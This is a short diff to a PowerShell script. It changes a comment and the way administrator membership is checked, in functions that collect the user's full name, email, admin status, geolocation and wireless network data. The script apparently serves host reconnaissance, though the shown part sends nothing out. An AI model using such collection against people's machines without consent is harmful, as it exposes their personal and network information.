@@ -38,7 +38,7 @@ function Get-fullName {
 
     }
  
- # If no name is detected function will return $env:UserName 
+ # If no name is detected function will return NA
 
     # Write Error is just for troubleshooting 
     catch {Write-Error "No name was detected" 
@@ -118,14 +118,13 @@ function wireless_markdown {
     }
     return $wifi_json
 }
-
 # mark user information
 function user_markdown {
 
     # general values
     $full_name = Get-fullName
     $email = Get-email
-    $is_admin = ($currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    $is_admin = (Get-LocalGroupMember 'Administrators').Name -contains "$env:COMPUTERNAME\$env:USERNAME"
 
     # geolocation values
     $GL = (Get-GeoLocation) -split " "
